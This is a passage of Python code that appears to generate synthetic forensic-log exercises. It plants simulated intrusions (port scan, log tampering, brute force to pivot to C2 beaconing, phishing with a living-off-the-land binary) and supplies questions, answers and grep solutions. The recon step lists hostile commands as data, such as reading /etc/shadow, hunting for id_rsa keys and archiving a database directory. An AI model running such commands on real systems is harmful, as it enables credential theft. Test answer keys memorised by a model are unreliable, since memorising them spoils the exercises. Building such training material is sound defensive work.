        events.append((t, access_line(t, ip, "GET", path, "HTTP/1.1", 200, rng.randint(500_000, 4_000_000), "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")))
    # a normal daytime login so the IP->username cross-reference in auth.log always resolves
    # (noise alone doesn't guarantee this specific user shows up in the login noise)
    login_t = ctx.random_ts()
    auth_events.append((login_t, auth_line(login_t, ctx.primary_bastion, "sshd", rng.randint(1000, 32000),
                        f"Accepted password for {user} from {ip} port {rng.randint(30000,60000)} ssh2")))
    # likewise, a routine daytime workstation event so endpoint.log's user->host mapping
    # resolves once you know which employee this is -- the next real DFIR step is knowing
    # which physical machine to go investigate
    workstation = ctx.user_workstation[user]
    wkstn_t = ctx.random_ts()
    endpoint_events = [(wkstn_t, endpoint_line(wkstn_t, workstation, user, rng.randint(9001, 32000),
                        rng.randint(1000, 9000), "outlook.exe", "explorer.exe", "outlook.exe /recycle"))]
    nights = len(chosen_days)
    facts = dict(user=user, ip=ip, path=path, nights=nights, workstation=workstation)
    questions = [
        dict(q=f"An internal account has been accessing `{path}` several times between 01:00-05:00 -- outside "
               "normal business hours. What internal IP is doing this?",
             a=ip,
             cmd=f"grep -F '{path}' access.log | grep -P '\\[\\d{{2}}/\\w+/\\d{{4}}:0[1-4]:' | cut -d' ' -f1 | sort -u",
             explain="The PCRE pattern matches only timestamps whose hour field is 01-04, isolating the after-hours hits; the IP is always the first space-delimited field.",
             skills=["-P", "pipeline"]),
        dict(q="Cross-referencing that IP against auth.log, which username owns it?",
             a=user,
             cmd=f"grep -F -w '{ip}' auth.log | grep -oP '(?<=for )\\w+(?= from)' | sort -u",
             explain="Correlating the access.log IP against auth.log logins identifies the human behind the address.",
             skills=["-F", "-P", "pipeline"]),
        dict(q="On how many separate nights did this after-hours access occur?",
             a=str(nights),
             cmd=f"grep -F '{path}' access.log | grep -F -w '{ip}' | grep -oP '(?<=\\[)\\d{{2}}/\\w{{3}}/\\d{{4}}' | sort -u | wc -l",
             explain="A lookbehind on the opening bracket extracts just the DD/Mon/YYYY date, and deduplicating counts distinct calendar nights.",
             skills=["-F", "-P", "pipeline"]),
        dict(q="Now that you have the employee's identity, one more piece of corroboration before you escalate: "
               "which physical workstation hostname is tied to that account in endpoint.log? (That's the "
               "machine you'd actually go image if this gets escalated to a formal investigation.)",
             a=workstation,
             cmd=f"grep -F -w '{user}' endpoint.log | awk '{{print $4}}' | sort -u",
             explain="endpoint.log is a third, independent source (neither web nor SSH logs) tying the same "
                     "account to a specific physical asset -- the detail that turns 'we suspect this person' "
                     "into 'we know which machine to seize.'",
             skills=["-F", "pipeline"]),
    ]
    return dict(key="insider_after_hours", title="Insider after-hours access",
                briefing="A legitimate account is repeatedly accessing sensitive data late at night.",
                events={"access": events, "auth": auth_events, "endpoint": endpoint_events},
                facts=facts, questions=questions)


# ---------------------------------------------------------------- 14. Port scanning
def plant_port_scan(ctx, used):
    rng = ctx.rng
    scanner = _new_ip(ctx, used)
    target = ctx.unique_internal_ip()
    ports = rng.sample(range(1, 65000), k=rng.randint(80, 250))
    start = ctx.random_ts()
    events = []
    for i, p in enumerate(sorted(ports)):
        t = start + timedelta(seconds=i * rng.choice([0, 1]))
        ident = rng.randint(10000, 99999)
        mac = ":".join(f"{rng.randint(0,255):02x}" for _ in range(6))
        events.append((t, iptables_line(t, ctx.primary_fw, "DROP", "eth0", "", mac, scanner, target, "TCP",
                                         rng.randint(1024, 65000), p, "SYN", ident)))
    facts = dict(scanner=scanner, target=target, n_ports=len(ports))
    questions = [
        dict(q=f"One IP swept a large number of distinct destination ports on `{target}` in a short window -- "
               "a port scan. How many distinct ports did it hit?",
             a=str(len(ports)),
             cmd=f"grep -F -w '{scanner}' firewall.log | grep -oP 'DPT=\\K\\S+' | sort -u | wc -l",
             explain="\\K strips the 'DPT=' label so -o prints just the port; sort -u | wc -l counts distinct ones.",
             skills=["-P", "-o", "pipeline"]),
        dict(q="What IP performed the scan? (Careful: ranking source IPs by raw DROP-line count can pick the "
               "wrong one -- background internet scan noise can rack up plenty of hits too. Rank by *distinct "
               "port count* instead.)",
             a=scanner,
             cmd="grep DROP firewall.log | grep -oP 'SRC=\\K\\S+|DPT=\\K\\S+' | paste - - | "
                 "sort -u | cut -f1 | sort | uniq -c | sort -rn | head -1",
             explain="grep -o's alternation prints SRC= then DPT= as two separate lines per match, so `paste - -` "
                     "re-pairs them into one 'src<TAB>port' row per original line; sort -u dedupes repeat hits on the "
                     "same port, and only then does counting rows-per-IP measure distinct ports instead of raw volume.",
             skills=["-P", "-o", "pipeline"]),
    ]
    return dict(key="port_scanning", title="Port scanning",
                briefing=f"A rapid sweep across many destination ports on `{target}` was logged by the firewall.",
                events={"firewall": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 15. Log tampering
def plant_log_tampering(ctx, used):
    rng = ctx.rng
    host = ctx.primary_bastion
    events = []
    doubled_count = rng.randint(4, 9)
    templates = [
        "Accepted password for {u} from {ip} port {p} ssh2",
        "session opened for user {u}",
        "Failed password for {u} from {ip} port {p} ssh2",
    ]
    for _ in range(doubled_count):
        t = ctx.random_ts()
        u = ctx.noise_user()
        ip = ctx.user_ips[u]
        p = rng.randint(30000, 60000)
        tmpl = rng.choice(templates)
        # inject a doubled word, e.g. "session opened opened for..." -- but never double the
        # IP token, since its embedded dots break the \b(\w+)\s+\1\b backreference match
        words = tmpl.format(u=u, ip=ip, p=p).split()
        safe_idx = [i for i, w in enumerate(words) if w != ip and not w.isdigit()]
        dup_idx = rng.choice(safe_idx)
        words.insert(dup_idx, words[dup_idx])
        msg = " ".join(words)
        events.append((t, auth_line(t, host, "sshd", rng.randint(1000, 32000), msg)))
    restart_t = ctx.random_ts()
    events.append((restart_t, f"{syslog_ts(restart_t)} {host} rsyslogd: -- MARK -- log service restarted"))
    facts = dict(doubled_count=doubled_count, restart_t=restart_t, host=host)
    questions = [
        dict(q="Some auth.log lines show a suspicious doubled-word artifact (e.g. the same word appearing "
               "twice in a row), consistent with a script clumsily editing log entries. How many such lines exist?",
             a=str(doubled_count),
             cmd=r"grep -Pc '\b([A-Za-z]\w{2,})\s+\1\b' auth.log",
             explain="Backreference \\1 (PCRE-only) requires the same word to repeat immediately; restricting it to "
                     "letter-led tokens keeps the coincidental 'DD HH:MM:SS' day/hour digit match (e.g. day 10, hour 10:xx) out of the count.",
             skills=["-P", "-c"]),
        dict(q="At what timestamp (HH:MM:SS) does the suspicious 'log service restarted' marker appear?",
             a=restart_t.strftime("%H:%M:%S"),
             cmd="grep -F 'log service restarted' auth.log",
             explain="-F matches the marker text literally; a restart mark right in the middle of an incident window is a classic anti-forensics sign.",
             skills=["-F"]),
    ]
    return dict(key="log_tampering", title="Log tampering",
                briefing="auth.log shows signs of after-the-fact editing.",
                events={"auth": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 16. Full compromise chain
def plant_compromise_chain(ctx, used):
    """A single actor followed across all three network-facing logs: brute-forces SSH
    (auth.log), pivots deeper into the network using the compromised account (auth.log
    again, from a different source), runs recon on the new host (exec.log), then that
    same host beacons back out to the ORIGINAL attacker IP (firewall.log). No single
    question here is answerable from one log file in isolation the way most archetypes'
    questions are -- each step's finding has to be carried into the next log to either
    confirm or extend the story, which is closer to how a real multi-stage incident gets
    reconstructed than any single-log grep exercise.
    """
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    target_user = ctx.pick_protagonist_user()
    host = ctx.primary_bastion
    fail_count = rng.randint(30, 90)
    start = ctx.random_ts()
    times = _burst(ctx, start, fail_count, 2, 9)
    events_auth = []
    for t in times:
        pid = rng.randint(1000, 32000)
        port = rng.randint(30000, 60000)
        events_auth.append((t, auth_line(t, host, "sshd", pid,
                            f"Failed password for {target_user} from {attacker} port {port} ssh2")))
    success_t = times[-1] + timedelta(seconds=rng.randint(2, 8))
    success_pid = rng.randint(1000, 32000)
    events_auth.append((success_t, auth_line(success_t, host, "sshd", success_pid,
                        f"Accepted password for {target_user} from {attacker} port {rng.randint(30000,60000)} ssh2")))
    events_auth.append((success_t, auth_line(success_t, host, "sshd", success_pid,
                        f"pam_unix(sshd:session): session opened for user {target_user}(uid=1010) by (uid=0)")))

    # phase 2: pivot deeper using the same compromised account, now sourced from the
    # bastion's OWN address -- the attacker is operating from inside the network
    bastion_ip = ctx.host_ips[host]
    pivot_target = rng.choice(ctx.hosts["db"] + ctx.hosts["app"])
    pivot_t = success_t + timedelta(minutes=rng.randint(2, 12))
    events_auth.append((pivot_t, auth_line(pivot_t, pivot_target, "sshd", rng.randint(1000, 32000),
                        f"Accepted password for {target_user} from {bastion_ip} port {rng.randint(30000,60000)} ssh2")))

    # phase 3: recon on the newly reached host
    recon_cmd = rng.choice(["cat /etc/passwd", "find / -name id_rsa 2>/dev/null",
                             "tar -czf /tmp/.cache.tar.gz /var/lib/postgresql/data", "cat /etc/shadow",
                             "cp /etc/shadow /tmp/.s"])
    recon_t = pivot_t + timedelta(seconds=rng.randint(15, 90))
    events_exec = [(recon_t, exec_line(recon_t, pivot_target, 1010, target_user, "/bin/bash",
                    recon_cmd, rng.randint(1000, 32000)))]

    # phase 4: the pivot host beacons back out to the SAME external IP that ran the
    # original brute force -- independent (firewall.log) proof the two phases are the
    # same actor, not two unrelated incidents that happen to share a compromised account
    pivot_ip = ctx.host_ips[pivot_target]
    interval = rng.choice([60, 120, 300])
    n_beacon = rng.randint(15, 40)
    beacon_start = recon_t + timedelta(minutes=rng.randint(1, 5))
    events_firewall = []
    for i in range(n_beacon):
        t = beacon_start + timedelta(seconds=i * interval)
        events_firewall.append((t, iptables_line(
            t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), pivot_ip, attacker, "TCP",
            rng.randint(1024, 65000), rng.choice([443, 8443]), "SYN", rng.randint(10000, 99999))))

    facts = dict(attacker=attacker, target_user=target_user, host=host, pivot_target=pivot_target,
                 recon_cmd=recon_cmd, n_beacon=n_beacon, pivot_ip=pivot_ip)
    questions = [
        dict(q=f"An account (`{target_user}`) on `{host}` was hit with repeated failed SSH logins before "
               "finally succeeding. What IP was responsible?",
             a=attacker,
             cmd=f"grep -F -w '{target_user}' auth.log | grep 'Failed password' | grep -oP '(?<=from )\\S+' | sort -u",
             explain="Scoping to the targeted username first (rather than ranking every failed IP in the whole "
                     "file) avoids picking up an unrelated brute-force IP if more than one is running this scenario.",
             skills=["-F", "-P", "-o", "pipeline"]),
        dict(q=f"After that login succeeded, `{target_user}`'s credentials were used again from an internal "
               "IP to reach a second host -- the attacker pivoting deeper using the account they just "
               "compromised. Which host did they land on?",
             a=pivot_target,
             cmd=f"grep -F -w '{target_user}' auth.log | grep 'Accepted password' | tail -1 | awk '{{print $4}}'",
             explain="This account has exactly two successful logins in the log: the original compromise and "
                     "the pivot. Since auth.log is chronological, tail -1 grabs the later (pivot) one, and "
                     "field 4 of the syslog format is the hostname it landed on.",
             skills=["-F", "pipeline"]),
        dict(q=f"Once on `{pivot_target}`, corroborate what the attacker did there using exec.log -- what "
               "command did the compromised account run?",
             a=recon_cmd,
             cmd=f"grep -F -w '{pivot_target}' exec.log | grep -F -w '{target_user}'",
             explain="auth.log only proves a login happened; exec.log is an independent record of what actually "
                     "ran afterward -- without it you'd know someone got in, but not what they did next.",
             skills=["-F", "-w", "pipeline"]),
        dict(q="Final corroboration: does the pivot host show any outbound activity tying it back to the "
               "*original* attacker IP from question 1, confirming this is one continuous incident rather than "
               "two unrelated ones? Cross-reference firewall.log for the pivot host's IP -- what external IP "
               "does it keep connecting out to?",
             a=attacker,
             cmd=f"grep -F -w '{pivot_ip}' firewall.log | grep ACCEPT | grep -oP 'DST=\\K\\S+' | sort | uniq -c | sort -rn | head -1",
             explain="Tying the beacon destination back to the SAME IP identified in question 1 -- via a "
                     "completely different log file -- is what upgrades 'these might be related' to 'this is "
                     "confirmed to be one actor across the whole kill chain'.",
             skills=["-F", "-P", "-o", "pipeline"]),
    ]
    return dict(key="compromise_chain", title="Full compromise chain (brute force -> pivot -> recon -> C2)",
                briefing=f"`{host}` took repeated failed SSH logins that eventually succeeded, and the "
                         "compromised account was seen authenticating elsewhere shortly after.",
                events={"auth": events_auth, "exec": events_exec, "firewall": events_firewall},
                facts=facts, questions=questions)


# ---------------------------------------------------------------- 17. Workstation phishing/malware chain
def plant_workstation_malware(ctx, used):
    """A phishing lure gets opened on an employee workstation, spawns a living-off-the-land
    binary, and the workstation calls out to C2 -- followed across endpoint.log (which
    requires walking a process tree: matching a child process by its PARENT field, not
    just spotting one suspicious event), dns.log, and firewall.log.
    """
    rng = ctx.rng
    user = ctx.pick_protagonist_user()
    workstation = ctx.user_workstation[user]
    ip = ctx.user_ips[user]
    c2_ip = _new_ip(ctx, used)
    lure = rng.choice(PHISHING_LURES)
    lolbin_image, lolbin_cmd = rng.choice(LOLBIN_COMMANDS)

    start = ctx.random_ts()
    opener = rng.choice(["outlook.exe", "chrome.exe"])
    open_pid = rng.randint(9001, 32000)
    open_ppid = rng.randint(1000, 9000)
    events_endpoint = [
        (start, endpoint_line(start, workstation, user, open_pid, open_ppid, lure, opener,
                               f"\"C:\\Users\\{user}\\Downloads\\{lure}\""))
    ]
    # the LOLBin's parent is the lure's OWN image -- that's what lets a question walk the
    # tree (lure -> LOLBin) instead of just grepping for a suspicious binary directly
    lolbin_t = start + timedelta(seconds=rng.randint(2, 15))
    lolbin_pid = rng.randint(9001, 32000)
    events_endpoint.append((lolbin_t, endpoint_line(lolbin_t, workstation, user, lolbin_pid, open_pid,
                            lolbin_image, lure, lolbin_cmd)))

    # DNS resolution for the C2 domain -- resolved to c2_ip (see c2_beaconing for why the
    # dns_line "server" slot is repurposed here to carry the real answer)
    c2_domain = (f"{rng.choice(['secure-update', 'ms-telemetry', 'cdn-static', 'account-verify'])}-"
                 f"{rand_hex(rng, 3)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}")
    dns_t = lolbin_t + timedelta(seconds=rng.randint(1, 10))
    events_dns = [(dns_t, dns_line(dns_t, ctx.primary_dns, ip, rng.randint(1024, 65000), c2_domain, "A", c2_ip))]

    conn_t = dns_t + timedelta(seconds=rng.randint(1, 5))
    events_firewall = [(conn_t, iptables_line(
        conn_t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
        ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), ip, c2_ip, "TCP",
        rng.randint(1024, 65000), rng.choice([443, 8443]), "SYN", rng.randint(10000, 99999)))]

    facts = dict(user=user, workstation=workstation, ip=ip, infected=ip, lure=lure,
                 lolbin_image=lolbin_image, c2_domain=c2_domain, c2_ip=c2_ip)
    questions = [
        dict(q="An employee workstation's endpoint.log shows a process launched with a double file "
               "extension (e.g. ending in `.pdf.exe` or `.doc.exe`) -- a classic phishing lure disguise. "
               "What is the exact filename?",
             a=lure,
             cmd=r"grep -oP 'image=\"\K[^\"]*\.\w+\.exe(?=\")' endpoint.log | sort -u",
             explain="The lookahead stops the match right before the closing quote so -o prints just the "
                     "filename; requiring a SECOND extension before .exe is what singles out the disguised "
                     "lure from ordinary single-extension launches like chrome.exe.",
             skills=["-P", "-o", "pipeline"]),
        dict(q="Which workstation is this happening on, and which user account is it?",
             a=f"{workstation} ({user})",
             cmd=f"grep -F '{lure}' endpoint.log",
             explain="endpoint.log's host and user= fields on that same line identify both the machine and "
                     "the account without needing a second lookup.",
             skills=["-F"]),
        dict(q="The lure then spawned a second process -- a living-off-the-land binary, a common way to "
               "blend malicious execution into legitimate system tools. Walk the process tree in endpoint.log: "
               "what process did the lure spawn?",
             a=lolbin_image,
             cmd=f"grep -F 'parent=\"{lure}\"' endpoint.log | grep -oP 'image=\"\\K[^\"]+'",
             explain="Filtering on parent=\"<lure>\" finds the child process the lure itself launched -- "
                     "reading a process tree means matching on the PARENT field, not just searching for "
                     "suspicious images directly.",
             skills=["-F", "-o", "pipeline"]),
        dict(q="Corroborate in dns.log: just before the workstation's outbound connection, what domain did "
               "it resolve?",
             a=c2_domain,
             cmd=f"grep -F -w '{ip}' dns.log",
             explain="A resolution immediately preceding an outbound connection to the same answer IP is "
                     "what turns 'this workstation made a connection' into 'this workstation reached out to "
                     "infrastructure it just looked up' -- consistent with malware-driven C2, not routine browsing.",
             skills=["-F", "-w"]),
        dict(q="Final corroboration in firewall.log: what external IP did the workstation actually connect "
               "out to?",
             a=c2_ip,
             cmd=f"grep -F -w '{ip}' firewall.log | grep ACCEPT | grep -oP 'DST=\\K\\S+'",
             explain="Three independent logs -- endpoint.log's process tree, dns.log's resolution, and "
                     "firewall.log's connection -- all agreeing on the same machine and the same "
                     "infrastructure is what makes this a confirmed compromise instead of three separate, "
                     "maybe-unrelated observations.",
             skills=["-F", "-w", "-o", "pipeline"]),
    ]
    return dict(key="workstation_malware", title="Workstation phishing/malware chain",
                briefing=f"`{workstation}` shows a suspicious double-extension file execution followed by "
                         "unusual outbound network activity.",
                events={"endpoint": events_endpoint, "dns": events_dns, "firewall": events_firewall},
                facts=facts, questions=questions)


REGISTRY = [
    plant_ssh_bruteforce, plant_password_spraying, plant_credential_stuffing, plant_web_shell_upload,
    plant_sql_injection, plant_directory_traversal, plant_dns_tunneling, plant_dga_beaconing,
    plant_c2_beaconing, plant_data_exfil, plant_priv_esc, plant_lateral_movement,
    plant_insider_access, plant_port_scan, plant_log_tampering, plant_compromise_chain,
    plant_workstation_malware,
]
